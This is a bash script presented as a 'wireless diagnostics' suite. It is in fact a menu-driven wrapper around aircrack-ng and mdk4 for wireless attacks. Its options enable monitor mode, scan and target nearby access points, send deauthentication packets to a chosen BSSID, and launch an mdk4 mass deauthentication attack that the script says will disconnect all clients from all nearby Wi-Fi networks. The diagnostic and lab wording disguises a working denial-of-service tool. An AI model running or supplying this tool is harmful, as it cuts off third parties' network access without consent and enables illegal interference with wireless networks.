#!/bin/bash
##  ===================================================================
##  RAEED-SYSTEMS : Wireless Interface Diagnostics & Automation Suite
##  Lead Architect : RAEED KHAN (BBA student university of buner kpk)
##  ===================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
ORANGE='\033[0;33m'
WHITE='\033[0;37m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${ORANGE}  _____            ______ ______ _____  ${NC}"
    echo -e "${RED} |  __ \\    /\\    |  ____|  ____|  __ \\ ${NC}"
    echo -e "${GREEN} | |__) |  /  \\   | |__  | |__  | |  | |${NC}"
    echo -e "${YELLOW} |  _  /  / /\\ \\  |  __| |  __| | |  | |${NC}"
    echo -e "${BLUE} | | \\ \\ / ____ \\ | |____| |____| |__| |${NC}"
    echo -e "${CYAN} |_|  \\_\\_/__  \\_\\______|______|_____/  ${NC}"
    echo -e ""
    echo -e "${BLUE}[+] =============================================== [+]${NC}"
    echo -e "${GREEN}[+] Framework : RAEED-SYSTEMS WIRELESS AUTOMATION   [+]${NC}"
    echo -e "${GREEN}[+] Lead      : Raeed Khan (BBA student UOB)        [+]${NC}"
    echo -e "${BLUE}[+] =============================================== [+]${NC}"
    echo ""
}

while true; do
    show_banner
    echo -e "${CYAN}[1]${NC} Enable Monitor Mode (airmon-ng start)"
    echo -e "${CYAN}[2]${NC} Kill Conflicting Processes (check kill)"
    echo -e "${CYAN}[3]${NC} Survey Nearby Wireless Networks (airodump-ng)"
    echo -e "${CYAN}[4]${NC} Target Specific BSSID Diagnostics"
    echo -e "${CYAN}[5]${NC} Run Local Signal Test (Single Deauth)"
    echo -e "${CYAN}[6]${NC} Run Mass Deauth Attack (All APs & Clients via MDK4)"
    echo -e "${CYAN}[7]${NC} Exit Framework"
    echo ""
    read -p "Select an operation [1-7]: " choice

    case $choice in
        1)
            echo -e "\n${GREEN}[+] Activating Wireless Monitor Mode...${NC}"
            if iwconfig 2>&1 | grep -q "wlan0mon"; then
                echo -e "${YELLOW}[!] wlan0mon is already in Monitor Mode!${NC}"
            else
                sudo airmon-ng start wlan0
            fi
            read -p "Press [Enter] to return to main menu..."
            ;;
        2)
            echo -e "\n${YELLOW}[!] Clearing Conflicting Network Management Daemons...${NC}"
            sudo airmon-ng check kill
            read -p "Press [Enter] to return to main menu..."
            ;;
        3)
            echo -e "\n${GREEN}[+] Starting General Network Environment Scan...${NC}"
            echo -e "${YELLOW}[!] Press Ctrl+C to Stop scanning and return to menu.${NC}\n"
            sleep 2
            sudo airodump-ng wlan0mon
            read -p "Press [Enter] to return to main menu..."
            ;;
        4)
            echo -e "\n${CYAN}[+] Configuring Target Specific Analysis${NC}"
            read -p "Enter Target BSSID: " bssid
            read -p "Enter Channel Number: " channel
            echo -e "\n${GREEN}[+] Auditing Target: $bssid on Channel: $channel...${NC}"
            echo -e "${YELLOW}[!] Press Ctrl+C to Stop and return to menu.${NC}\n"
            sleep 2
            sudo airodump-ng --bssid "$bssid" -c "$channel" wlan0mon
            read -p "Press [Enter] to return to main menu..."
            ;;
        5)
            echo -e "\n${RED}[!] Initiating Local Lab Environment Deauthentication Test${NC}"
            read -p "Enter Target BSSID: " bssid
            read -p "Enter Number of Packets: " packets
            echo -e "\n${YELLOW}[+] Transmitting localized validation packets...${NC}"
            sudo aireplay-ng --deauth "$packets" -a "$bssid" wlan0mon
            read -p "Press [Enter] to return to main menu..."
            ;;
        6)
            echo -e "\n${RED}[!!!] WARNING: Initiating Mass Deauthentication Attack [!!!]${NC}"
            echo -e "${YELLOW}[*] This will disconnect ALL clients from ALL nearby Wi-Fi networks.${NC}"
            echo -e "${CYAN}[?] Checking if mdk4 is installed...${NC}"
            
            if ! command -v mdk4 &> /dev/null; then
                echo -e "${RED}[-] mdk4 is not installed. Installing it now...${NC}"
                sudo apt update && sudo apt install mdk4 -y
            fi
            
            echo -e "\n${GREEN}[+] mdk4 is ready.${NC}"
            echo -e "${YELLOW}[!] Launching Mass Deauth (Deauth/Disas Attack Mode)...${NC}"
            echo -e "${RED}[!] Press Ctrl+C to STOP the mass attack and restore networks.${NC}\n"
            sleep 3
            
            # MDK4 'd' mode targets all APs and jumps channels automatically
            sudo mdk4 wlan0mon d
            
            read -p "Press [Enter] to return to main menu..."
            ;;
        7)
            echo -e "\n${BLUE}[+] Exiting RAEED-SYSTEMS Framework. Stay Safe!${NC}\n"
            exit 0
            ;;
        *)
            echo -e "\n${RED}[-] Invalid selection.${NC}"
            sleep 1
            ;;
    esac
done
